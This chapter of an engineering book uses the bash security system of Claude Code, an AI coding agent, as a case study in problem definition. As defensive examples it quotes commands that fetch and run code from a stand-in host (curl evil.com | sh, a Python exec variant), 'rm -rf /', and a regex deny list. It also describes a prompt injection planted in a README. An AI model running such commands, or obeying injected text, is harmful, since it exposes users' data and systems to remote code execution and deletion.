Chapter 2: Problem Definition

The Most Expensive Skill You Never Practiced

The most common cause of failed software projects is not bad code. It is not inadequate testing, wrong technology choices, or insufficient staffing. It is building the wrong thing. And you build the wrong thing when you skip problem definition and jump straight to solutions.

This is not a soft-skills lecture. Problem definition is a rigorous engineering discipline with specific techniques, and getting it wrong has quantifiable costs. A misunderstood requirement propagates through design, implementation, testing, and deployment. Each layer amplifies the error. By the time you discover that you solved the wrong problem, you have invested weeks or months in an elaborate solution to a question nobody asked.

In this chapter, we will study problem definition through the lens of one of the most instructive examples in the Claude Code codebase: the bash security system. What started as a simple question -- "which shell commands should an AI agent be allowed to execute?" -- consumed over 12,000 lines of code across six files, required a full shell grammar parser, and evolved through at least four distinct problem formulations before reaching its current architecture. Not because the engineers were indecisive, but because the problem kept revealing new dimensions as they understood it more deeply.

This is the nature of hard problems. They do not arrive well-defined. They arrive as symptoms, complaints, or vague unease. The engineer's job is to interrogate the symptom until the real problem emerges, define it precisely, discover the constraints that bound the solution space, and only then -- only after all of this -- begin solving.

Symptoms Are Not Problems

An engineer reports: "The AI agent executed a dangerous command that deleted user files." This is a symptom. Here are five different problems that could produce this symptom:

  1. The command was inherently dangerous and should have been blocked. (Missing deny rule)
  2. The command looked safe but had a dangerous side effect. (Inadequate analysis)
  3. The user approved the command without reading it. (UX failure)
  4. The LLM was manipulated by prompt injection into requesting the command. (Security boundary failure)
  5. The permission system evaluated the command but misclassified it. (Classifier bug)

Each of these problems leads to a completely different solution. Problem 1 needs a bigger deny list. Problem 2 needs deeper command analysis. Problem 3 needs better permission dialog design. Problem 4 needs prompt injection defenses. Problem 5 needs better classification logic.

If you start coding before identifying which problem you have, you will build the wrong solution. You might add 500 entries to a deny list when the real issue is that your classifier cannot parse pipe chains. You might redesign the permission dialog when the real issue is that untrusted content is injecting commands.

The Interrogation Protocol

When a symptom arrives, resist the urge to solve it. Instead, interrogate it:

What happened? "The agent executed rm -rf ./data/ without asking."

What should have happened? "The agent should have asked for permission before executing a destructive file operation."

Why didn't it? "The permission system classified rm -rf ./data/ as safe."

Why did it classify it as safe? "The deny rules check for rm -rf / (root deletion) but not for rm -rf with relative paths."

What is the general case of this failure? "The deny rules are pattern-based. Any destructive command not explicitly listed in the deny patterns will be misclassified."

Now you have a problem statement: "Pattern-based deny rules cannot cover all dangerous shell commands because the space of dangerous commands is unbounded. We need a classification approach that generalizes." This problem statement points toward structural analysis (parsing commands into components and evaluating their risk) rather than pattern enumeration (adding more deny rules).

The five "why" questions took two minutes. They saved weeks of work on the wrong solution.

The Anatomy of a Problem Statement

A well-formed engineering problem statement has five components:

1. Context

What system are we working in? What are its boundaries? Who are the users?

For the bash security problem in Claude Code:

An AI CLI agent executes shell commands on behalf of an LLM in the user's development environment. The LLM selects commands to achieve user-specified goals. The agent must decide, for each command, whether to execute it immediately, ask the user for permission, or block it entirely.

Context establishes the operating environment. It is not the problem -- it is the stage on which the problem plays out.

2. The Problem

What specific failure are we preventing or capability are we enabling? State it precisely.

We must classify arbitrary shell commands into three categories -- safe to auto-execute, requires user approval, and blocked -- with high accuracy, low latency, and no false negatives on dangerous commands. A false negative (classifying a dangerous command as safe) has catastrophic consequences: data loss, credential theft, or system compromise. A false positive (classifying a safe command as dangerous) has moderate consequences: unnecessary permission prompts that degrade user experience.

This statement establishes the asymmetry. False negatives are catastrophic; false positives are annoying. This asymmetry will drive every design decision.

3. Constraints

What are the non-negotiable boundaries?

Constraints: - Latency: Classification must complete in under 50ms. The user is waiting. - No external dependencies: The classifier cannot shell out to shellcheck, linters, or other tools that may not be installed. - Coverage: The classifier must handle the full POSIX shell grammar, including pipes, redirections, command substitution, arithmetic expansion, heredocs, and every quoting variant. - Adversarial robustness: The LLM may be manipulated by prompt injection. Commands must be evaluated structurally, not by trusting the LLM's stated intent. - Offline operation: The classifier cannot make network calls.

Constraints eliminate solution space. Before discovering these constraints, the solution space included "call an LLM to evaluate each command" (violates latency and offline constraints), "use shellcheck" (violates no-external-dependency constraint), and "trust the LLM's stated intent" (violates adversarial robustness constraint). After constraints, the solution space narrows to: a local, fast, dependency-free classifier that parses the full shell grammar.

4. Success Criteria

How will we know the problem is solved?

Success criteria: - Zero false negatives on a test suite of 200+ known-dangerous command patterns. - Classification latency under 10ms for typical commands (< 100 characters). - Graceful handling of malformed input (unparseable commands default to "requires approval," not "safe"). - No regression in the existing permission system's behavior.

Success criteria must be specific and measurable. "The system should be secure" is not a success criterion. "Zero false negatives on a defined test suite" is.

5. Non-Goals

What are we explicitly not solving?

Non-goals: - We are not preventing the user from running dangerous commands manually. The user can always override. - We are not detecting malware. We are classifying commands by structural risk, not by matching known malware signatures. - We are not sandboxing command execution. Commands run with the user's full permissions.

Non-goals prevent scope creep. Without them, a well-intentioned engineer will extend the bash classifier into a malware detection system, a sandbox, or a full shell emulator. Non-goals are the fence around the problem.

Constraint Discovery: The Hard Part

Writing problem statements is a learnable format. Discovering constraints is the hard part. Constraints are not listed in requirements documents. They emerge from investigation, from talking to users, from understanding the operational environment, and from imagining failure scenarios.

Technique 1: Failure-First Thinking

Instead of asking "how should the system work?", ask "how will the system fail?" For every failure mode, a constraint emerges:

Failure Mode Constraint It Reveals
The LLM generates a command with nested quoting that the parser cannot handle The parser must handle the complete shell grammar
A malicious README injects a prompt that makes the LLM request curl evil.com \| sh Commands must be evaluated structurally, not based on LLM intent
The classifier takes 500ms to parse a long command, making the UX feel broken Classification must complete in under 50ms
A command uses an obscure bash feature (<(process substitution)) that the classifier doesn't recognize Unrecognized constructs must default to "ask user," not "allow"
Enterprise policy requires certain commands to always be blocked, regardless of user preference The classification system must integrate with an externally-defined policy layer

Each row of this table represents a constraint that was not in the original requirements. These constraints were discovered by a thinking engineer who imagined failures before they happened.

Technique 2: Boundary Analysis

Every system has boundaries -- places where your code meets something you do not control. Each boundary is a constraint source:

The shell grammar constrains the parser's complexity. LLM behavior constrains the classifier's trust model. User expectations constrain the UX of permission prompts. Enterprise policy constrains override mechanisms. The operating system constrains which shell features exist.

Each boundary is an interview subject. Ask the boundary: "What can you throw at me that I have not anticipated?"

Technique 3: The "What Can't We Do?" Exercise

Before deciding what you will build, enumerate what you cannot build. This sounds backwards, but it is the fastest way to converge on a viable solution.

For the bash security problem:

What we cannot do: - We cannot sandbox command execution (too complex, too slow, platform-dependent) - We cannot call an LLM for classification (too slow, requires network, non-deterministic) - We cannot use an external tool like shellcheck (dependency we do not control) - We cannot enumerate all dangerous commands (the space is infinite) - We cannot trust the LLM's stated intent ("I'm just reading a file" -- but the command is rm -rf /) - We cannot block all unknown commands (users would abandon the tool)

What we can do: - We can parse commands into structural components (ASTs) - We can define risk categories based on structural patterns (pipes into interpreters, recursive deletion, network exfiltration) - We can maintain a fast, local, deterministic classifier - We can default to "ask user" for ambiguous cases

The "can't" list eliminates solutions. The "can" list reveals the viable path. Together, they converge on the architecture that was actually built: a 4,400-line shell parser producing ASTs that a structural risk classifier evaluates against known dangerous patterns, with a default-to-ask policy for anything unrecognized.

Case Study: The Bash Security System

Let us trace the full evolution of Claude Code's bash security system through its problem definitions. This is not a chronological history -- it is a reconstruction of how the problem definition matured as understanding deepened.

Problem Definition v1: Pattern Matching

Initial formulation: "Block known-dangerous commands."

The first approach was a deny list -- regular expressions matching commands like rm -rf /, DROP TABLE, chmod 777, and mkfs. Simple, fast, easy to understand.

// v1: Pattern matching (simplified)
const DANGEROUS_PATTERNS = [
  /^rm\s+-rf\s+\//,          // rm -rf /
  /DROP\s+TABLE/i,            // SQL injection
  /chmod\s+777/,              // Overpermissive permissions
  /mkfs/,                     // Filesystem creation
  /dd\s+if=.*of=\/dev/,       // Raw disk write
];

function isDangerous(command: string): boolean {
  return DANGEROUS_PATTERNS.some(p => p.test(command));
}

Why this problem definition failed: It is playing whack-a-mole. The space of dangerous commands is infinite. For every pattern you add, an adversary can find a formulation that bypasses it. rm -rf / is caught, but rm -rf ./ is not. rm -rf ~/ is not. find / -delete is not. curl evil.com | sh is not caught because neither curl nor sh individually is dangerous -- the danger is in their composition.

The problem was not "which commands are dangerous?" It was "how do we understand what a command does?"

Problem Definition v2: Command Decomposition

Revised formulation: "Understand the structure of shell commands to evaluate their risk."

This formulation shifts from pattern matching to structural analysis. You cannot classify curl evil.com | sh as dangerous by looking at the words. You need to parse the pipe, identify that the output of curl feeds into sh, and recognize the pattern: arbitrary code execution from a remote source.

This leads to the requirement for a parser. Not a simple tokenizer -- a full parser that handles:

Shell Construct Why It Matters for Security
Pipes (cmd1 \| cmd2) The danger is in the composition, not the individual commands
Command substitution ($(cmd) or `cmd`) Commands can be hidden inside arguments
Process substitution (<(cmd)) File arguments can actually be command outputs
Heredocs (<<EOF ... EOF) Multi-line content can contain hidden commands
Quoting ('single', "double", $'ansi-c') Quoting affects whether variables and commands are expanded
Semicolons and &&/\|\| Multiple commands in one string
Redirections (> /etc/passwd) Overwrites to sensitive files
Variable expansion (${var}) Command composition through variables

Each row represents a shell feature that an attacker can use to disguise a dangerous command as a safe one. A parser that does not handle heredocs will miss dangerous commands embedded in heredoc blocks. A parser that does not handle ANSI-C quoting will misparse escape sequences.

The problem definition now implies a specific architectural decision: we need a parser that handles the full shell grammar.

Problem Definition v3: Risk Classification on ASTs

Further revised formulation: "Given a parsed AST of a shell command, classify its risk level using structural patterns."

With a parser producing ASTs, the classification problem becomes tractable. Instead of matching string patterns, we match structural patterns:

    CMD["Input: curl https://evil.com | bash"]
    PARSE["Parser: Decompose into AST"]
    AST["AST: Pipeline(SimpleCommand(curl, url), SimpleCommand(bash))"]
    CLASSIFY["Classifier: Check structural patterns"]
    RESULT["Result: DANGEROUS - remote code execution"]

    CMD --> PARSE
    PARSE --> AST
    AST --> CLASSIFY
    CLASSIFY --> RESULT

    style CMD fill:#4a3f00,stroke:#eab308,color:#fff
    style RESULT fill:#4a0e0e,stroke:#ef4444,color:#fff

The classifier operates on the AST, not on the raw string. It can detect patterns like:

  • Remote code execution: A network command (curl, wget) piped into an interpreter (sh, bash, python, eval)
  • Privilege escalation: Commands prefixed with sudo, su, or doas
  • Destructive file operations: rm with recursive and force flags targeting broad paths
  • Data exfiltration: Commands that read sensitive files and pipe them to network tools
  • System modification: Writing to /etc/, /usr/, system service directories

Each pattern is defined in terms of AST node types and relationships, not string patterns. The pattern for remote code execution is not "the string contains curl and sh" -- it is "a Pipeline node where the left child is a network command and the right child is an interpreter."

This structural approach handles obfuscation that string matching misses:

# All of these match the "remote code execution" structural pattern:
curl https://evil.com | sh
wget -O- https://evil.com | bash
curl https://evil.com | bash -c "$(cat)"
python3 -c "import urllib.request; exec(urllib.request.urlopen('https://evil.com').read())"

The last example shows the limits -- a classifier that only understands shell ASTs cannot trace execution into Python's exec(). The problem definition addresses this by establishing the boundary: classify shell-level risk, not runtime behavior.

Problem Definition v4: Three-Layer Classification

Final formulation: "Classify shell commands through three independent layers -- static rules, structural analysis, and AI-based judgment -- with deny-before-ask-before-allow semantics."

The mature problem definition recognizes that no single classification approach is sufficient:

graph TD
    CMD["Shell Command"]
    L1["Layer 1: Static Rules<br/>Glob patterns from settings<br/>deny > ask > allow"]
    L2["Layer 2: Structural Analysis<br/>AST-based risk patterns<br/>Parser + Security module"]
    L3["Layer 3: AI Classifier<br/>Secondary LLM call<br/>For ambiguous cases only"]
    RESULT["Classification Result"]

    CMD --> L1
    L1 -->|"matched deny"| BLOCK[Blocked]
    L1 -->|"matched allow"| ALLOW[Auto-approved]
    L1 -->|"no match"| L2
    L2 -->|"known dangerous"| ASK_D[Ask User - Dangerous]
    L2 -->|"known safe"| ALLOW
    L2 -->|"ambiguous"| L3
    L3 -->|"safe"| ALLOW
    L3 -->|"dangerous"| ASK_AI[Ask User - AI Flagged]

    style CMD fill:#1a1a2e,stroke:#e94560,color:#fff
    style BLOCK fill:#4a0e0e,stroke:#ef4444,color:#fff
    style ALLOW fill:#0a4c2e,stroke:#10b981,color:#fff
    style ASK_D fill:#4a3f00,stroke:#eab308,color:#fff
    style ASK_AI fill:#4a3f00,stroke:#eab308,color:#fff

Layer 1 (static rules) uses glob-pattern matching from the configuration cascade. An enterprise administrator can deny Bash(rm -rf *). A user can allow Bash(git *). These rules are fast (microseconds) and deterministic.

Layer 2 (structural analysis) is the parser-based classifier. It handles the general case: commands that no static rule covers but whose structure reveals their risk level.

Layer 3 (AI classifier) is a secondary LLM call that evaluates commands Layer 2 cannot classify. It adds latency and cost but handles commands that are structurally ambiguous (safe syntax but dangerous semantics).

The evaluation order -- deny before ask before allow -- ensures that explicit deny rules always win, regardless of what the structural analyzer or AI classifier thinks. This is a security invariant: you can always block a command by adding a deny rule.

What the Evolution Teaches

The bash security system went through four problem definitions not because the engineers were confused, but because understanding the problem is the work. Each formulation revealed new dimensions:

  • v1 revealed that the space of dangerous commands is unbounded.
  • v2 revealed that understanding command structure is necessary.
  • v3 revealed that structural patterns can classify most commands.
  • v4 revealed that no single layer handles all cases -- you need defense in depth.

The final system spans 12,000+ lines across six files:

File Lines Role in the Architecture
bashParser.ts ~4,400 Full POSIX shell parser: tokenizer, AST builder, grammar rules
ast.ts ~2,700 AST node type definitions, traversal utilities, analysis helpers
bashSecurity.ts ~2,600 Structural risk patterns: injection, escalation, exfiltration
bashPermissions.ts ~2,600 Rule evaluation: deny/ask/allow against the settings cascade
readOnlyValidation.ts ~1,990 Read-only classification for auto-mode: is this command side-effect-free?
BashTool.ts ~800 Tool implementation: ties parser, security, and permissions together

12,000+ lines for "which commands are safe?" If you had started coding at problem definition v1, you would have built a 200-line regex matcher. It would have shipped. It would have been bypassed within a week. The 12,000 lines exist because the problem definition evolved, and each evolution demanded more sophisticated machinery.

The Problem Definition Template

Every engineering problem benefits from a structured definition before work begins. Here is the template, with the bash security system as the worked example:

Template

PROBLEM DEFINITION
==================

Context:
  What system? What users? What operational environment?

Problem:
  What specific failure or capability? State precisely.

Constraints:
  What cannot change? What bounds the solution space?

Success Criteria:
  How will we know it's solved? (Specific, measurable)

Non-Goals:
  What are we explicitly not solving?

Failure Modes:
  How can the solution fail? What is the consequence of each?

Open Questions:
  What do we not yet know? What investigation is needed?

This template takes 20-30 minutes to fill out. It prevents weeks of wasted work. It is the single highest-leverage activity in engineering.

Common Problem Definition Failures

Failure 1: Solving the Solution

The most common mistake is defining the problem as a solution. "We need a microservices architecture" is not a problem -- it is a solution. The problem might be "our monolith takes 45 minutes to deploy, and independent teams cannot release without coordinating." The solution might be microservices. Or it might be better CI/CD pipelines. Or it might be feature flags that decouple deployment from release. You cannot evaluate the solution until you define the problem.

In Claude Code, "we need a bash parser" is a solution. The problem is "we need to classify shell commands by structural risk." The parser is one implementation. A shell emulator would be another. A tree-sitter grammar would be a third. Defining the problem as "build a parser" forecloses the evaluation of alternatives.

Failure 2: Problem as Symptom

"The tests are slow" is a symptom. The problem might be: - The test suite runs all tests sequentially when they could run in parallel - Integration tests start a database for each test instead of sharing one - The test framework itself has slow startup - The tests are actually fast but the CI runner is underpowered

Each of these is a different problem with a different solution. Investigating the symptom before defining the problem saves you from optimizing the wrong thing.

Failure 3: Missing Constraints

A problem definition without constraints is a blank check. "Build a permission system" without constraints allows everything from a simple boolean flag to a full RBAC engine with role hierarchies, attribute-based policies, and audit logging. Constraints like "must work without a database," "must classify in under 50ms," and "must integrate with enterprise MDM" narrow the solution space to something achievable.

The most dangerous missing constraint is the one nobody thought to ask about. In Claude Code's case, the constraint "must resist adversarial input" was not in the initial requirements. It emerged from threat modeling -- the realization that the LLM could be manipulated by prompt injection in untrusted content. If this constraint had been discovered after building a trust-based classifier, the entire system would have needed redesigning.

Failure 4: Premature Precision

Problem definitions should be precise about what to solve but imprecise about how to solve it. "Build a recursive descent parser for POSIX shell with 47 grammar rules" is premature precision. "Parse shell commands into ASTs that support structural risk analysis" is appropriately precise about the goal and imprecise about the implementation.

The rule of thumb: if your problem definition constrains the implementation technique, you have slipped from problem definition into design. Pull back.

Failure 5: Missing Failure Modes

A problem definition without failure modes is optimistic fiction. Every system fails. The question is not whether it will fail, but how. A problem definition that enumerates failure modes forces the designer to build recovery paths before they encounter failures in production.

Claude Code's bash classifier has three failure modes, each with a designed recovery:

  1. Parser failure: Unrecognized syntax defaults to "needs approval" (fail-safe)
  2. Classifier uncertainty: Ambiguous commands escalate to the AI classifier (defense in depth)
  3. AI classifier manipulation: Static deny rules override AI judgment for known-dangerous patterns (policy override)

Each recovery was designed because the failure mode was anticipated in the problem definition. None of them would have been designed if the problem definition said only "classify commands as safe or dangerous."

This is why problem definition is more valuable than code. The architecture falls out of a good problem definition. The code falls out of a good architecture. But without the problem definition, you are guessing at architecture, and every guess is a coin flip.

The Iterative Nature of Problem Definition

Problem definition is not a phase that ends. It is a continuous process that runs alongside implementation. As you build, you learn things that change the problem:

During parser implementation, the team discovered that bash and sh have different quoting rules for ANSI-C strings ($'...'). The problem definition expanded: "must handle POSIX shell grammar" became "must handle multiple shell dialects."

During testing, the team discovered that some commands are dangerous on macOS but safe on Linux (and vice versa). The problem definition expanded: "must classify commands by risk" became "must classify commands by risk with platform awareness."

During production deployment, the team discovered that users frequently run package managers (npm install, pip install) that are technically "write operations" but are expected to be auto-approved in development workflows. The problem definition expanded: "classify by structural risk" became "classify by structural risk with context-aware exceptions for common development tools."

Each expansion added code. The parser grew to handle dialect differences. The classifier gained platform-specific rules. The permission system gained "common development command" heuristics. The 12,000-line total is not accidental -- it is the accumulation of problem understanding over time.

When to Revise the Problem Definition

Three signals indicate your problem definition needs revision:

  1. Edge cases are multiplying. If you keep adding special cases to handle situations your design did not anticipate, the problem definition is too narrow. Widen it.

  2. The solution feels forced. If the implementation requires increasingly complex workarounds to fit the architecture, the architecture may be solving the wrong problem. Step back and re-examine.

  3. Users are working around your solution. If users are disabling your permission system, suppressing your warnings, or finding escape hatches, you have solved a problem they do not have. Find the real problem.

Problem Definition as a Team Practice

Problem definition is not a solo activity. It benefits from multiple perspectives, especially perspectives outside engineering:

Product managers reveal user constraints. "Our enterprise customers require MDM-enforced policies" is a constraint that changes the permission architecture.

Security engineers reveal adversarial constraints. "The LLM can be manipulated by prompt injection" is a constraint that changes the trust model.

Support engineers reveal failure constraints. "Users report that the permission prompt appears 40 times per session" is a signal that the classification threshold is wrong.

Operations engineers reveal deployment constraints. "We cannot require users to install external tools" eliminates shellcheck as a dependency.

The problem definition template is a communication artifact. It can be reviewed by non-engineers who understand the domain but not the implementation. A product manager can review success criteria. A security engineer can review failure modes. An operations engineer can review constraints. Each reviewer adds a constraint or failure mode that the original author missed.

The Economics of Problem Definition

Problem definition has a measurable return on investment. Here is the calculation:

Cost of a wrong problem definition: The bash security system, built on regex matching (problem definition v1), would have taken approximately 2 days to implement. It would have been bypassed within a week of deployment. Fixing it would require discarding the regex approach and building a parser -- 3 weeks of work. Total cost: 2 days wasted + 3 weeks of recovery = 17 days.

Cost of a right problem definition: Spending 2 days on problem definition (techniques in this chapter) and building the parser-based classifier directly: 2 days of problem definition + 3 weeks of implementation = 17 days. Same calendar time, but zero waste. The parser ships correctly the first time.

Cost of an evolved problem definition: Spending 1 day on initial problem definition, building a minimal parser, learning from deployment, and iterating: 1 day of problem definition + 1 week minimal implementation + 2 weeks iteration = 16 days. Slightly faster, with the benefit of production learning.

The economics are not about speed. They are about waste. A wrong problem definition creates work that must be discarded. A right problem definition creates work that accumulates. Over a career, the difference between engineers who define problems well and those who do not is measured in months of wasted effort.

Key Principles

  1. Symptoms are not problems. Interrogate every symptom with "why?" until the structural cause emerges. The five-why technique takes minutes and saves weeks.

  2. Constraints are more valuable than requirements. Requirements tell you what to build. Constraints tell you what you cannot build, which narrows the solution space to what's actually viable.

  3. Failure modes are design inputs. Every failure mode you anticipate in the problem definition becomes a recovery path in the architecture. Failure modes you miss become production incidents.

  4. Problem definition is iterative. Your first formulation will be wrong. Build enough to learn, then revise the definition. The bash security system went through four formulations. Each one was right for its level of understanding.

  5. The problem definition template is the highest-leverage artifact in engineering. Twenty minutes of structured thinking prevents weeks of building the wrong thing. Context, problem, constraints, success criteria, non-goals, failure modes, open questions. Fill it out before you write a line of code.

Think About It

  1. The definition drill. Take a bug you fixed recently. Write the problem definition retroactively -- context, problem, constraints, success criteria. Now look at your fix. Did it solve the problem you defined, or a different problem? If different, what would the correct fix have been?

  2. Constraint archaeology. Your system has performance constraints that nobody documented. Find one by measurement: profile a critical path, identify the slowest step, and determine what the performance budget should be. Write it down. Now ask: if you had known this constraint before building the system, what would you have designed differently?

  3. The failure mode exercise. Take a system you are responsible for. List every external dependency (APIs, databases, filesystems, networks). For each one, answer: "What happens when this dependency is unavailable?" If the answer is "the system crashes" or "I don't know," you have found a gap in your problem definition.

  4. Problem definition v1 vs. v4. Take a feature you are about to build. Write a problem definition in 5 minutes (v1). Now spend 30 minutes on failure-first thinking and boundary analysis. Write a revised problem definition (v2). Compare them. What constraints and failure modes did v2 reveal that v1 missed? How would the architecture differ?

  5. The non-goal test. Look at a recent project that experienced scope creep. Write the non-goals that should have been in the problem definition. Would those non-goals have prevented the creep? Share them with your team and discuss: is it harder to define what you are building, or what you are not building?
